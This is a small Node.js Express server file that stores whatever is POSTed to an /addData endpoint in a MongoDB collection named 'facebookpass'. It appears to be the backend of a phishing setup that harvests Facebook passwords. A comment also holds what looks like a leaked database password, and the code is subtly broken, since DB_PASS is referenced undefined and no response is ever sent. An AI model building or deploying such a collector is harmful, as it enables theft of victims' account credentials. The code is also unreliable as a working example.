const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const MongoClient = require('mongodb').MongoClient;
require('dotenv').config();


// byOO467TRPBvBFYB
// const uri = ' mongodb://127.0.0.1:27017/';
const uri = `mongodb+srv://${process.env.DB_USER}:${DB_PASS}@cluster0.zkkoe.mongodb.net/facebook?retryWrites=true&w=majority`

const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });


const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(cors())

client.connect(err => {
    const DataCollection = client.db('facebook').collection('facebookpass');
    app.post('/addData', (req, res) => {
        const Data = req.body;
        DataCollection.insertOne(Data)
    })

})




app.listen(process.env.PORT || 3000);